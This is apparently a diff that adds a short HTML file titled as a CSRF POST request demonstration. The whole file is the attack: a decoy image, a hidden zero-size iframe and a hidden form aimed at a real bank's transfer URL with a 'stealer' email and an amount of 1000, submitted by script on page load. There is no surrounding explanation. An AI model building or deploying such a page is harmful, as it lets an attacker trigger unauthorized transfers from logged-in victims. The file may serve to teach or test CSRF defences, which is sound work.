@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF-post请求</title>
+    <script src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+</head>
+<body>
+    <img src="http://tupian.enterdesk.com/2014/mxy/06/09/2/1.jpg" >
+
+    <iframe id="stealerFrame" width="0" height="0"></iframe>
+
+    <form id="myForm" action="http://icbc.com/transfer/" method="post">
+        <input type="hidden" name="email" value="stealer@qq.com">
+        <input type="hidden" name="money" value="1000">
+    </form>
+
+    <Script>
+         window.onload = function () {
+            var stealerFrame = $("#stealerFrame");
+            var myForm = $("#myForm");
+            stealerFrame.contents().find('html').html(myForm);
+
+            stealerFrame.contents().find('html').children('#myForm').submit();
+    }
+    </Script>
+</body>
+</html>
